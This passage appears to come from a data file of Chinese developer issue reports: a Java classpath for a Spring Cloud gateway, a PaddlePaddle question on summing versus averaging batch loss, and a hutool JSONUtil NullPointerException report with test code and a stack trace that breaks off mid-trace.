boot-starter-data-redis-1.5.15.RELEASE.jar:/Users/ljh/.m2/repository/org/springframework/data/spring-data-redis/1.8.13.RELEASE/spring-data-redis-1.8.13.RELEASE.jar:/Users/ljh/.m2/repository/org/springframework/data/spring-data-keyvalue/1.2.13.RELEASE/spring-data-keyvalue-1.2.13.RELEASE.jar:/Users/ljh/.m2/repository/org/springframework/data/spring-data-commons/1.13.13.RELEASE/spring-data-commons-1.13.13.RELEASE.jar:/Users/ljh/.m2/repository/org/springframework/spring-tx/4.3.18.RELEASE/spring-tx-4.3.18.RELEASE.jar:/Users/ljh/.m2/repository/org/springframework/spring-oxm/4.3.18.RELEASE/spring-oxm-4.3.18.RELEASE.jar:/Users/ljh/.m2/repository/org/slf4j/jcl-over-slf4j/1.7.25/jcl-over-slf4j-1.7.25.jar:/Users/ljh/.m2/repository/redis/clients/jedis/2.9.0/jedis-2.9.0.jar:/Users/ljh/.m2/repository/org/apache/commons/commons-pool2/2.4.3/commons-pool2-2.4.3.jar:/Users/ljh/.m2/repository/org/springframework/boot/spring-boot-starter-cache/1.5.15.RELEASE/spring-boot-starter-cache-1.5.15.RELEASE.jar:/Users/ljh/.m2/repository/org/springframework/spring-context/4.3.18.RELEASE/spring-context-4.3.18.RELEASE.jar:/Users/ljh/.m2/repository/org/springframework/spring-expression/4.3.18.RELEASE/spring-expression-4.3.18.RELEASE.jar:/Users/ljh/.m2/repository/org/springframework/spring-context-support/4.3.18.RELEASE/spring-context-support-4.3.18.RELEASE.jar:/Users/ljh/.m2/repository/com/alibaba/fastjson/1.2.46/fastjson-1.2.46.jar:/Users/ljh/.m2/repository/com/xiaoleilu/hutool-all/3.3.2/hutool-all-3.3.2.jar:/Users/ljh/.m2/repository/commons-io/commons-io/2.5/commons-io-2.5.jar:/Users/ljh/.m2/repository/com/github/ulisesbocchio/jasypt-spring-boot-starter/1.18/jasypt-spring-boot-starter-1.18.jar:/Users/ljh/.m2/repository/com/github/ulisesbocchio/jasypt-spring-boot/1.18/jasypt-spring-boot-1.18.jar:/Users/ljh/.m2/repository/org/jasypt/jasypt/1.9.2/jasypt-1.9.2.jar:/Users/ljh/.m2/repository/com/baomidou/mybatis-plus/2.1.9/mybatis-plus-2.1.9.jar:/Users/ljh/.m2/repository/com/baomidou/mybatis-plus-support/2.1.9/mybatis-plus-support-2.1.9.jar:/Users/ljh/.m2/repository/org/mybatis/mybatis-spring/1.3.1/mybatis-spring-1.3.1.jar:/Users/ljh/.m2/repository/org/mybatis/mybatis/3.4.5/mybatis-3.4.5.jar:/Users/ljh/.m2/repository/org/springframework/spring-jdbc/4.3.18.RELEASE/spring-jdbc-4.3.18.RELEASE.jar:/Users/ljh/.m2/repository/com/baomidou/mybatis-plus-core/2.1.9/mybatis-plus-core-2.1.9.jar:/Users/ljh/.m2/repository/com/github/jsqlparser/jsqlparser/1.1/jsqlparser-1.1.jar:/Users/ljh/.m2/repository/com/baomidou/mybatis-plus-generate/2.1.9/mybatis-plus-generate-2.1.9.jar:/Users/ljh/.m2/repository/org/apache/velocity/velocity-engine-core/2.0/velocity-engine-core-2.0.jar:/Users/ljh/.m2/repository/org/freemarker/freemarker/2.3.28/freemarker-2.3.28.jar:/Users/ljh/.m2/repository/org/springframework/retry/spring-retry/1.2.2.RELEASE/spring-retry-1.2.2.RELEASE.jar:/Users/ljh/.m2/repository/org/springframework/boot/spring-boot-starter-aop/1.5.15.RELEASE/spring-boot-starter-aop-1.5.15.RELEASE.jar:/Users/ljh/.m2/repository/org/springframework/spring-aop/4.3.18.RELEASE/spring-aop-4.3.18.RELEASE.jar:/Users/ljh/.m2/repository/org/aspectj/aspectjweaver/1.8.13/aspectjweaver-1.8.13.jar:/Users/ljh/.m2/repository/org/hibernate/hibernate-validator/5.4.1.Final/hibernate-validator-5.4.1.Final.jar:/Users/ljh/.m2/repository/javax/validation/validation-api/1.1.0.Final/validation-api-1.1.0.Final.jar:/Users/ljh/.m2/repository/org/jboss/logging/jboss-logging/3.3.2.Final/jboss-logging-3.3.2.Final.jar:/Users/ljh/.m2/repository/com/fasterxml/classmate/1.3.4/classmate-1.3.4.jar:/Users/ljh/.m2/repository/io/github/openfeign/feign-okhttp/9.5.0/feign-okhttp-9.5.0.jar:/Users/ljh/.m2/repository/io/github/openfeign/feign-core/9.5.0/feign-core-9.5.0.jar:/Users/ljh/.m2/repository/org/jvnet/animal-sniffer-annotation/1.0/animal-sniffer-annotation-1.0.jar:/Users/ljh/.m2/repository/com/squareup/okhttp3/okhttp/3.6.0/okhttp-3.6.0.jar:/Users/ljh/.m2/repository/com/squareup/okio/okio/1.11.0/okio-1.11.0.jar:/Users/ljh/.m2/repository/io/springfox/springfox-swagger2/2.8.0/springfox-swagger2-2.8.0.jar:/Users/ljh/.m2/repository/io/swagger/swagger-annotations/1.5.14/swagger-annotations-1.5.14.jar:/Users/ljh/.m2/repository/io/swagger/swagger-models/1.5.14/swagger-models-1.5.14.jar:/Users/ljh/.m2/repository/io/springfox/springfox-spi/2.8.0/springfox-spi-2.8.0.jar:/Users/ljh/.m2/repository/io/springfox/springfox-core/2.8.0/springfox-core-2.8.0.jar:/Users/ljh/.m2/repository/net/bytebuddy/byte-buddy/1.7.9/byte-buddy-1.7.9.jar:/Users/ljh/.m2/repository/io/springfox/springfox-schema/2.8.0/springfox-schema-2.8.0.jar:/Users/ljh/.m2/repository/io/springfox/springfox-swagger-common/2.8.0/springfox-swagger-common-2.8.0.jar:/Users/ljh/.m2/repository/com/google/guava/guava/20.0/guava-20.0.jar:/Users/ljh/.m2/repository/org/slf4j/slf4j-api/1.7.25/slf4j-api-1.7.25.jar:/Users/ljh/.m2/repository/org/springframework/plugin/spring-plugin-core/1.2.0.RELEASE/spring-plugin-core-1.2.0.RELEASE.jar:/Users/ljh/.m2/repository/org/springframework/plugin/spring-plugin-metadata/1.2.0.RELEASE/spring-plugin-metadata-1.2.0.RELEASE.jar:/Users/ljh/.m2/repository/org/mapstruct/mapstruct/1.2.0.Final/mapstruct-1.2.0.Final.jar:/Users/ljh/.m2/repository/com/luhuiguo/fastdfs-spring-boot-starter/0.2.0/fastdfs-spring-boot-starter-0.2.0.jar:/Users/ljh/.m2/repository/com/luhuiguo/fastdfs-client/0.4.0/fastdfs-client-0.4.0.jar:/Users/ljh/.m2/repository/ch/qos/logback/logback-classic/1.1.11/logback-classic-1.1.11.jar:/Users/ljh/.m2/repository/ch/qos/logback/logback-core/1.1.11/logback-core-1.1.11.jar:/Users/ljh/.m2/repository/org/apache/commons/commons-lang3/3.5/commons-lang3-3.5.jar:/Users/ljh/.m2/repository/commons-beanutils/commons-beanutils/1.9.3/commons-beanutils-1.9.3.jar:/Users/ljh/.m2/repository/org/springframework/boot/spring-boot/1.5.15.RELEASE/spring-boot-1.5.15.RELEASE.jar:/Users/ljh/.m2/repository/com/alibaba/transmittable-thread-local/2.2.0/transmittable-thread-local-2.2.0.jar:/Users/ljh/.m2/repository/org/springframework/cloud/spring-cloud-starter-bus-amqp/1.3.4.RELEASE/spring-cloud-starter-bus-amqp-1.3.4.RELEASE.jar:/Users/ljh/.m2/repository/org/springframework/cloud/spring-cloud-starter-stream-rabbit/1.3.4.RELEASE/spring-cloud-starter-stream-rabbit-1.3.4.RELEASE.jar:/Users/ljh/.m2/repository/org/springframework/cloud/spring-cloud-stream-binder-rabbit/1.3.4.RELEASE/spring-cloud-stream-binder-rabbit-1.3.4.RELEASE.jar:/Users/ljh/.m2/repository/org/springframework/cloud/spring-cloud-stream-binder-rabbit-core/1.3.4.RELEASE/spring-cloud-stream-binder-rabbit-core-1.3.4.RELEASE.jar:/Users/ljh/.m2/repository/org/springframework/cloud/spring-cloud-stream-codec/1.3.3.RELEASE/spring-cloud-stream-codec-1.3.3.RELEASE.jar:/Users/ljh/.m2/repository/com/esotericsoftware/kryo-shaded/3.0.3/kryo-shaded-3.0.3.jar:/Users/ljh/.m2/repository/com/esotericsoftware/minlog/1.3.0/minlog-1.3.0.jar:/Users/ljh/.m2/repository/org/springframework/boot/spring-boot-starter-amqp/1.5.15.RELEASE/spring-boot-starter-amqp-1.5.15.RELEASE.jar:/Users/ljh/.m2/repository/org/springframework/amqp/spring-rabbit/1.7.9.RELEASE/spring-rabbit-1.7.9.RELEASE.jar:/Users/ljh/.m2/repository/org/springframework/amqp/spring-amqp/1.7.9.RELEASE/spring-amqp-1.7.9.RELEASE.jar:/Users/ljh/.m2/repository/com/rabbitmq/http-client/1.1.1.RELEASE/http-client-1.1.1.RELEASE.jar:/Users/ljh/.m2/repository/com/rabbitmq/amqp-client/4.0.3/amqp-client-4.0.3.jar:/Users/ljh/.m2/repository/org/springframework/integration/spring-integration-amqp/4.3.17.RELEASE/spring-integration-amqp-4.3.17.RELEASE.jar:/Users/ljh/.m2/repository/org/springframework/cloud/spring-cloud-bus/1.3.4.RELEASE/spring-cloud-bus-1.3.4.RELEASE.jar:/Users/ljh/.m2/repository/org/springframework/cloud/spring-cloud-stream/1.3.3.RELEASE/spring-cloud-stream-1.3.3.RELEASE.jar:/Users/ljh/.m2/repository/org/springframework/boot/spring-boot-starter-validation/1.5.15.RELEASE/spring-boot-starter-validation-1.5.15.RELEASE.jar:/Users/ljh/.m2/repository/org/springframework/spring-messaging/4.3.18.RELEASE/spring-messaging-4.3.18.RELEASE.jar:/Users/ljh/.m2/repository/org/springframework/integration/spring-integration-jmx/4.3.17.RELEASE/spring-integration-jmx-4.3.17.RELEASE.jar:/Users/ljh/.m2/repository/org/springframework/spring-tuple/1.0.0.RELEASE/spring-tuple-1.0.0.RELEASE.jar:/Users/ljh/.m2/repository/org/springframework/integration/spring-integration-tuple/1.0.0.RELEASE/spring-integration-tuple-1.0.0.RELEASE.jar:/Users/ljh/.m2/repository/org/springframework/integration/spring-integration-core/4.3.17.RELEASE/spring-integration-core-4.3.17.RELEASE.jar:/Users/ljh/.m2/repository/org/springframework/cloud/spring-cloud-starter-zuul/1.4.5.RELEASE/spring-cloud-starter-zuul-1.4.5.RELEASE.jar:/Users/ljh/.m2/repository/org/springframework/cloud/spring-cloud-starter-netflix-zuul/1.4.5.RELEASE/spring-cloud-starter-netflix-zuul-1.4.5.RELEASE.jar:/Users/ljh/.m2/repository/org/springframework/cloud/spring-cloud-starter-netflix-hystrix/1.4.5.RELEASE/spring-cloud-starter-netflix-hystrix-1.4.5.RELEASE.jar:/Users/ljh/.m2/repository/com/netflix/hystrix/hystrix-core/1.5.12/hystrix-core-1.5.12.jar:/Users/ljh/.m2/repository/org/hdrhistogram/HdrHistogram/2.1.9/HdrHistogram-2.1.9.jar:/Users/ljh/.m2/repository/com/netflix/hystrix/hystrix-metrics-event-stream/1.5.12/hystrix-metrics-event-stream-1.5.12.jar:/Users/ljh/.m2/repository/com/netflix/hystrix/hystrix-serialization/1.5.12/hystrix-serialization-1.5.12.jar:/Users/ljh/.m2/repository/com/fasterxml/jackson/module/jackson-module-afterburner/2.8.11/jackson-module-afterburner-2.8.11.jar:/Users/ljh/.m2/repository/com/netflix/hystrix/hystrix-javanica/1.5.12/hystrix-javanica-1.5.12.jar:/Users/ljh/.m2/repository/org/ow2/asm/asm/5.0.4/asm-5.0.4.jar:/Users/ljh/.m2/repository/com/netflix/zuul/zuul-core/1.3.1/zuul-core-1.3.1.jar:/Users/ljh/.m2/repository/com/netflix/netflix-commons/netflix-commons-util/0.1.1/netflix-commons-util-0.1.1.jar:/Users/ljh/.m2/repository/com/marcosbarbero/cloud/spring-cloud-zuul-ratelimit/1.5.0.RELEASE/spring-cloud-zuul-ratelimit-1.5.0.RELEASE.jar:/Users/ljh/.m2/repository/com/marcosbarbero/cloud/spring-cloud-zuul-ratelimit-core/1.5.0.RELEASE/spring-cloud-zuul-ratelimit-core-1.5.0.RELEASE.jar:/Users/ljh/.m2/repository/org/springframework/cloud/spring-cloud-starter-oauth2/1.2.3.RELEASE/spring-cloud-starter-oauth2-1.2.3.RELEASE.jar:/Users/ljh/.m2/repository/org/springframework/cloud/spring-cloud-starter-security/1.2.3.RELEASE/spring-cloud-starter-security-1.2.3.RELEASE.jar:/Users/ljh/.m2/repository/org/springframework/cloud/spring-cloud-security/1.2.3.RELEASE/spring-cloud-security-1.2.3.RELEASE.jar:/Users/ljh/.m2/repository/org/springframework/boot/spring-boot-starter-security/1.5.15.RELEASE/spring-boot-starter-security-1.5.15.RELEASE.jar:/Users/ljh/.m2/repository/org/springframework/security/oauth/spring-security-oauth2/2.0.15.RELEASE/spring-security-oauth2-2.0.15.RELEASE.jar:/Users/ljh/.m2/repository/org/springframework/spring-beans/4.3.18.RELEASE/spring-beans-4.3.18.RELEASE.jar:/Users/ljh/.m2/repository/org/springframework/spring-webmvc/4.3.18.RELEASE/spring-webmvc-4.3.18.RELEASE.jar:/Users/ljh/.m2/repository/org/springframework/security/spring-security-core/4.2.7.RELEASE/spring-security-core-4.2.7.RELEASE.jar:/Users/ljh/.m2/repository/aopalliance/aopalliance/1.0/aopalliance-1.0.jar:/Users/ljh/.m2/repository/org/springframework/security/spring-security-config/4.2.7.RELEASE/spring-security-config-4.2.7.RELEASE.jar:/Users/ljh/.m2/repository/org/springframework/security/spring-security-web/4.2.7.RELEASE/spring-security-web-4.2.7.RELEASE.jar:/Users/ljh/.m2/repository/commons-codec/commons-codec/1.10/commons-codec-1.10.jar:/Users/ljh/.m2/repository/org/codehaus/jackson/jackson-mapper-asl/1.9.13/jackson-mapper-asl-1.9.13.jar:/Users/ljh/.m2/repository/org/codehaus/jackson/jackson-core-asl/1.9.13/jackson-core-asl-1.9.13.jar:/Users/ljh/.m2/repository/org/springframework/security/spring-security-jwt/1.0.9.RELEASE/spring-security-jwt-1.0.9.RELEASE.jar:/Users/ljh/.m2/repository/org/bouncycastle/bcpkix-jdk15on/1.56/bcpkix-jdk15on-1.56.jar:/Users/ljh/.m2/repository/org/bouncycastle/bcprov-jdk15on/1.56/bcprov-jdk15on-1.56.jar:/Users/ljh/.m2/repository/org/springframework/cloud/spring-cloud-starter-feign/1.4.5.RELEASE/spring-cloud-starter-feign-1.4.5.RELEASE.jar:/Users/ljh/.m2/repository/org/springframework/cloud/spring-cloud-starter-openfeign/1.4.5.RELEASE/spring-cloud-starter-openfeign-1.4.5.RELEASE.jar:/Users/ljh/.m2/repository/org/springframework/spring-web/4.3.18.RELEASE/spring-web-4.3.18.RELEASE.jar:/Users/ljh/.m2/repository/org/springframework/cloud/spring-cloud-commons/1.3.4.RELEASE/spring-cloud-commons-1.3.4.RELEASE.jar:/Users/ljh/.m2/repository/org/springframework/security/spring-security-crypto/4.2.7.RELEASE/spring-security-crypto-4.2.7.RELEASE.jar:/Users/ljh/.m2/repository/io/github/openfeign/feign-slf4j/9.5.0/feign-slf4j-9.5.0.jar:/Users/ljh/.m2/repository/io/github/openfeign/feign-hystrix/9.5.0/feign-hystrix-9.5.0.jar:/Users/ljh/.m2/repository/io/springfox/springfox-swagger-ui/2.8.0/springfox-swagger-ui-2.8.0.jar:/Users/ljh/.m2/repository/io/springfox/springfox-spring-web/2.8.0/springfox-spring-web-2.8.0.jar:/Users/ljh/.m2/repository/org/reflections/reflections/0.9.11/reflections-0.9.11.jar:/Users/ljh/.m2/repository/org/javassist/javassist/3.21.0-GA/javassist-3.21.0-GA.jar:/Users/ljh/.m2/repository/org/springframework/cloud/spring-cloud-starter-zipkin/1.3.4.RELEASE/spring-cloud-starter-zipkin-1.3.4.RELEASE.jar:/Users/ljh/.m2/repository/org/springframework/cloud/spring-cloud-starter-sleuth/1.3.4.RELEASE/spring-cloud-starter-sleuth-1.3.4.RELEASE.jar:/Users/ljh/.m2/repository/org/springframework/cloud/spring-cloud-sleuth-core/1.3.4.RELEASE/spring-cloud-sleuth-core-1.3.4.RELEASE.jar:/Users/ljh/.m2/repository/org/aspectj/aspectjrt/1.8.13/aspectjrt-1.8.13.jar:/Users/ljh/.m2/repository/org/springframework/cloud/spring-cloud-sleuth-zipkin/1.3.4.RELEASE/spring-cloud-sleuth-zipkin-1.3.4.RELEASE.jar:/Users/ljh/.m2/repository/io/zipkin/zipkin2/zipkin/2.7.1/zipkin-2.7.1.jar:/Users/ljh/.m2/repository/io/zipkin/reporter2/zipkin-reporter/2.5.0/zipkin-reporter-2.5.0.jar:/Users/ljh/.m2/repository/io/zipkin/reporter2/zipkin-sender-kafka11/2.5.0/zipkin-sender-kafka11-2.5.0.jar:/Users/ljh/.m2/repository/io/zipkin/reporter2/zipkin-sender-amqp-client/2.5.0/zipkin-sender-amqp-client-2.5.0.jar:/Users/ljh/.m2/repository/org/springframework/cloud/spring-cloud-starter-netflix-eureka-client/1.4.5.RELEASE/spring-cloud-starter-netflix-eureka-client-1.4.5.RELEASE.jar:/Users/ljh/.m2/repository/org/springframework/boot/spring-boot-starter-web/1.5.15.RELEASE/spring-boot-starter-web-1.5.15.RELEASE.jar:/Users/ljh/.m2/repository/org/springframework/boot/spring-boot-starter-tomcat/1.5.15.RELEASE/spring-boot-starter-tomcat-1.5.15.RELEASE.jar:/Users/ljh/.m2/repository/org/apache/tomcat/embed/tomcat-embed-core/8.5.32/tomcat-embed-core-8.5.32.jar:/Users/ljh/.m2/repository/org/apache/tomcat/tomcat-annotations-api/8.5.32/tomcat-annotations-api-8.5.32.jar:/Users/ljh/.m2/repository/org/apache/tomcat/embed/tomcat-embed-el/8.5.32/tomcat-embed-el-8.5.32.jar:/Users/ljh/.m2/repository/org/apache/tomcat/embed/tomcat-embed-websocket/8.5.32/tomcat-embed-websocket-8.5.32.jar:/Users/ljh/.m2/repository/org/springframework/cloud/spring-cloud-starter/1.3.4.RELEASE/spring-cloud-starter-1.3.4.RELEASE.jar:/Users/ljh/.m2/repository/org/springframework/cloud/spring-cloud-context/1.3.4.RELEASE/spring-cloud-context-1.3.4.RELEASE.jar:/Users/ljh/.m2/repository/org/springframework/security/spring-security-rsa/1.0.3.RELEASE/spring-security-rsa-1.0.3.RELEASE.jar:/Users/ljh/.m2/repository/org/springframework/cloud/spring-cloud-netflix-core/1.4.5.RELEASE/spring-cloud-netflix-core-1.4.5.RELEASE.jar:/Users/ljh/.m2/repository/org/springframework/boot/spring-boot-autoconfigure/1.5.15.RELEASE/spring-boot-autoconfigure-1.5.15.RELEASE.jar:/Users/ljh/.m2/repository/org/springframework/cloud/spring-cloud-netflix-eureka-client/1.4.5.RELEASE/spring-cloud-netflix-eureka-client-1.4.5.RELEASE.jar:/Users/ljh/.m2/repository/com/netflix/eureka/eureka-client/1.7.2/eureka-client-1.7.2.jar:/Users/ljh/.m2/repository/org/codehaus/jettison/jettison/1.2/jettison-1.2.jar:/Users/ljh/.m2/repository/stax/stax-api/1.0.1/stax-api-1.0.1.jar:/Users/ljh/.m2/repository/com/netflix/netflix-commons/netflix-eventbus/0.3.0/netflix-eventbus-0.3.0.jar:/Users/ljh/.m2/repository/com/netflix/netflix-commons/netflix-infix/0.3.0/netflix-infix-0.3.0.jar:/Users/ljh/.m2/repository/commons-jxpath/commons-jxpath/1.3/commons-jxpath-1.3.jar:/Users/ljh/.m2/repository/joda-time/joda-time/2.9.9/joda-time-2.9.9.jar:/Users/ljh/.m2/repository/org/antlr/antlr-runtime/3.4/antlr-runtime-3.4.jar:/Users/ljh/.m2/repository/org/antlr/stringtemplate/3.2.1/stringtemplate-3.2.1.jar:/Users/ljh/.m2/repository/antlr/antlr/2.7.7/antlr-2.7.7.jar:/Users/ljh/.m2/repository/com/google/code/gson/gson/2.8.5/gson-2.8.5.jar:/Users/ljh/.m2/repository/org/apache/commons/commons-math/2.2/commons-math-2.2.jar:/Users/ljh/.m2/repository/com/netflix/archaius/archaius-core/0.7.4/archaius-core-0.7.4.jar:/Users/ljh/.m2/repository/javax/ws/rs/jsr311-api/1.1.1/jsr311-api-1.1.1.jar:/Users/ljh/.m2/repository/com/netflix/servo/servo-core/0.10.1/servo-core-0.10.1.jar:/Users/ljh/.m2/repository/com/netflix/servo/servo-internal/0.10.1/servo-internal-0.10.1.jar:/Users/ljh/.m2/repository/com/sun/jersey/jersey-core/1.19.1/jersey-core-1.19.1.jar:/Users/ljh/.m2/repository/com/sun/jersey/jersey-client/1.19.1/jersey-client-1.19.1.jar:/Users/ljh/.m2/repository/com/sun/jersey/contribs/jersey-apache-client4/1.19.1/jersey-apache-client4-1.19.1.jar:/Users/ljh/.m2/repository/org/apache/httpcomponents/httpclient/4.5.6/httpclient-4.5.6.jar:/Users/ljh/.m2/repository/org/apache/httpcomponents/httpcore/4.4.10/httpcore-4.4.10.jar:/Users/ljh/.m2/repository/com/google/inject/guice/3.0/guice-3.0.jar:/Users/ljh/.m2/repository/javax/inject/javax.inject/1/javax.inject-1.jar:/Users/ljh/.m2/repository/com/fasterxml/jackson/core/jackson-annotations/2.8.0/jackson-annotations-2.8.0.jar:/Users/ljh/.m2/repository/com/fasterxml/jackson/core/jackson-core/2.8.11/jackson-core-2.8.11.jar:/Users/ljh/.m2/repository/com/netflix/eureka/eureka-core/1.7.2/eureka-core-1.7.2.jar:/Users/ljh/.m2/repository/org/codehaus/woodstox/woodstox-core-asl/4.4.1/woodstox-core-asl-4.4.1.jar:/Users/ljh/.m2/repository/javax/xml/stream/stax-api/1.0-2/stax-api-1.0-2.jar:/Users/ljh/.m2/repository/org/codehaus/woodstox/stax2-api/3.1.4/stax2-api-3.1.4.jar:/Users/ljh/.m2/repository/org/springframework/cloud/spring-cloud-starter-netflix-archaius/1.4.5.RELEASE/spring-cloud-starter-netflix-archaius-1.4.5.RELEASE.jar:/Users/ljh/.m2/repository/commons-configuration/commons-configuration/1.8/commons-configuration-1.8.jar:/Users/ljh/.m2/repository/commons-lang/commons-lang/2.6/commons-lang-2.6.jar:/Users/ljh/.m2/repository/org/springframework/cloud/spring-cloud-starter-netflix-ribbon/1.4.5.RELEASE/spring-cloud-starter-netflix-ribbon-1.4.5.RELEASE.jar:/Users/ljh/.m2/repository/com/netflix/ribbon/ribbon/2.2.5/ribbon-2.2.5.jar:/Users/ljh/.m2/repository/com/netflix/ribbon/ribbon-transport/2.2.5/ribbon-transport-2.2.5.jar:/Users/ljh/.m2/repository/io/reactivex/rxnetty-contexts/0.4.9/rxnetty-contexts-0.4.9.jar:/Users/ljh/.m2/repository/io/reactivex/rxnetty-servo/0.4.9/rxnetty-servo-0.4.9.jar:/Users/ljh/.m2/repository/io/reactivex/rxnetty/0.4.9/rxnetty-0.4.9.jar:/Users/ljh/.m2/repository/io/netty/netty-codec-http/4.0.27.Final/netty-codec-http-4.0.27.Final.jar:/Users/ljh/.m2/repository/io/netty/netty-codec/4.0.27.Final/netty-codec-4.0.27.Final.jar:/Users/ljh/.m2/repository/io/netty/netty-handler/4.0.27.Final/netty-handler-4.0.27.Final.jar:/Users/ljh/.m2/repository/io/netty/netty-transport-native-epoll/4.0.27.Final/netty-transport-native-epoll-4.0.27.Final.jar:/Users/ljh/.m2/repository/io/netty/netty-common/4.0.27.Final/netty-common-4.0.27.Final.jar:/Users/ljh/.m2/repository/io/netty/netty-buffer/4.0.27.Final/netty-buffer-4.0.27.Final.jar:/Users/ljh/.m2/repository/io/netty/netty-transport/4.0.27.Final/netty-transport-4.0.27.Final.jar:/Users/ljh/.m2/repository/com/netflix/ribbon/ribbon-core/2.2.5/ribbon-core-2.2.5.jar:/Users/ljh/.m2/repository/com/netflix/ribbon/ribbon-httpclient/2.2.5/ribbon-httpclient-2.2.5.jar:/Users/ljh/.m2/repository/commons-collections/commons-collections/3.2.2/commons-collections-3.2.2.jar:/Users/ljh/.m2/repository/com/netflix/ribbon/ribbon-loadbalancer/2.2.5/ribbon-loadbalancer-2.2.5.jar:/Users/ljh/.m2/repository/com/netflix/netflix-commons/netflix-statistics/0.1.1/netflix-statistics-0.1.1.jar:/Users/ljh/.m2/repository/io/reactivex/rxjava/1.2.0/rxjava-1.2.0.jar:/Users/ljh/.m2/repository/com/netflix/ribbon/ribbon-eureka/2.2.5/ribbon-eureka-2.2.5.jar:/Users/ljh/.m2/repository/com/thoughtworks/xstream/xstream/1.4.10/xstream-1.4.10.jar:/Users/ljh/.m2/repository/xmlpull/xmlpull/1.1.3.1/xmlpull-1.1.3.1.jar:/Users/ljh/.m2/repository/xpp3/xpp3_min/1.1.4c/xpp3_min-1.1.4c.jar:/Users/ljh/.m2/repository/org/springframework/cloud/spring-cloud-starter-config/1.4.4.RELEASE/spring-cloud-starter-config-1.4.4.RELEASE.jar:/Users/ljh/.m2/repository/org/springframework/cloud/spring-cloud-config-client/1.4.4.RELEASE/spring-cloud-config-client-1.4.4.RELEASE.jar:/Users/ljh/.m2/repository/com/fasterxml/jackson/core/jackson-databind/2.8.11.2/jackson-databind-2.8.11.2.jar:/Users/ljh/.m2/repository/org/springframework/boot/spring-boot-configuration-processor/1.5.15.RELEASE/spring-boot-configuration-processor-1.5.15.RELEASE.jar:/Users/ljh/.m2/repository/org/springframework/boot/spring-boot-starter-actuator/1.5.15.RELEASE/spring-boot-starter-actuator-1.5.15.RELEASE.jar:/Users/ljh/.m2/repository/org/springframework/boot/spring-boot-starter/1.5.15.RELEASE/spring-boot-starter-1.5.15.RELEASE.jar:/Users/ljh/.m2/repository/org/springframework/boot/spring-boot-starter-logging/1.5.15.RELEASE/spring-boot-starter-logging-1.5.15.RELEASE.jar:/Users/ljh/.m2/repository/org/slf4j/jul-to-slf4j/1.7.25/jul-to-slf4j-1.7.25.jar:/Users/ljh/.m2/repository/org/slf4j/log4j-over-slf4j/1.7.25/log4j-over-slf4j-1.7.25.jar:/Users/ljh/.m2/repository/org/yaml/snakeyaml/1.17/snakeyaml-1.17.jar:/Users/ljh/.m2/repository/org/springframework/boot/spring-boot-actuator/1.5.15.RELEASE/spring-boot-actuator-1.5.15.RELEASE.jar:/Users/ljh/.m2/repository/org/projectlombok/lombok/1.16.20/lombok-1.16.20.jar:/Users/ljh/.m2/repository/org/objenesis/objenesis/2.5.1/objenesis-2.5.1.jar:/Users/ljh/.m2/repository/org/springframework/spring-core/4.3.18.RELEASE/spring-core-4.3.18.RELEASE.jar com.github.pig.gateway.PigGatewayApplication"
动态图计算loss反向传播时是否一定要先求均值mean？,PaddlePaddle版本：1.8.3 cuda 10 cudnn 7.6 根据官网的示例：https://www.paddlepaddle.org.cn/tutorials/projectdetail/593621 batch_loss应该先求均值再反向传播 但根据model项目中的示例（160，163行）：https://github.com/PaddlePaddle/models/blob/release/1.8/dygraph/reinforcement_learning/actor_critic.py 则是通过fluid.layers.reduce_sum来对batch losss做的处理，而没有求均值。 经实验，若将该强化学习项目中的相关代码替换成： 则收敛会变慢。 因为不清楚飞桨的内部是否能跟踪到batch的信息，所以想求证下哪种做法是正确的，又或者都正确？   <code>: avg_policy_loss = fluid.layers.mean(all_policy_loss) avg_value_loss = fluid.layers.mean(all_value_loss) avg_loss = avg_policy_loss + avg_value_loss avg_loss.backward() optimizer.minimize(avg_loss) optimizer.minimize
JSONUtil.toJsonStr()空指针了,"JDK版本： openjdk_8_201 hutool版本： 5.3.0 堆栈信息 <ol start=""3"">   <code>: @Test public void test01() { String str = ""{\""code\"":0,\""data\"":{\""list\"":[{\""acceptingAreaCode\"":\""3310\"",\""acquirerCode\"":\""0831043310\"",\""code\"":\""MIC-135883342371603336860289\"",\""createTs\"":\""2020-10-22 11:21:00\"",\""id\"":3084,\""merchantCode\"":\""HGSY00000000002\"",\""merchantLegalName\"":\""xxxxM\"",\""trialResults\"":[{\""collectionId\"":3084,\""collectionTrialPhotos\"":[],\""createBy\"":\""xxxx.com\"",\""createTs\"":\""2020-10-26 14:48:15\"",\""dictMicKey\"":0,\""id\"":2236,\""process\"":2,\""resultCode\"":1,\""resultReason\"":\""\"",\""resultRemark\"":\""\""}]}],\""pageNum\"":1,\""pageSize\"":10,\""pages\"":1,\""total\"":1},\""msg\"":\""成功\""}""; JSON json = JSONUtil.parse(str); Object o = JSONUtil.getByPath(json, "".data""); String s = JSONUtil.toJsonStr(o); System.out.println(s); } java.lang.NullPointerException at cn.hutool.json.JSONArray.doWrite(JSONArray.java:553) at cn.hutool.json.JSONArray.write(JSONArray.java:533) at cn.hutool.json.InternalJSONUtil.writeValue(InternalJSONUtil.java:45) at cn.hutool.json.JSONObject.doWrite(JSONObject.java:598) at cn.hutool.json.JSONObject.write(JSONObject.java:554) at cn.hutool.json.JSON.toJSONString(JSON.java:112) at cn.hutool.json.JSONUtil.toJsonStr(JSONUtil.java:299) at cn.hutool.json.JSONUtil.toJsonStr(JSONUtil.java:328) at TestJson.test01(TestJson.java:12) at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.base/java.lang.reflect.Method.invoke(Method.java:566) at org.junit.runners.model.FrameworkMethod$1.runReflectiveCall(FrameworkMethod.java:59) at org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:12) at org.junit.runners.model.FrameworkMethod.invokeExplosively(FrameworkMethod.java:56) at org.junit.internal.runners.statements.InvokeMethod.evaluate(InvokeMethod.java:17) at org.junit.runners.ParentRunner$3.evaluate(ParentRunner.java:306) at org.junit.runners.BlockJUnit4ClassRunner$1.evaluate(BlockJUnit4ClassRunner.java:100) at org.junit.runners.ParentRunner.runLeaf(ParentRunner.java:366) at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:103) at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:63) at org.junit.runners.ParentRunner$4.run(ParentRunner.java:331) at org.junit.runners.ParentRunner$1.schedule(ParentRunner.java:79) at 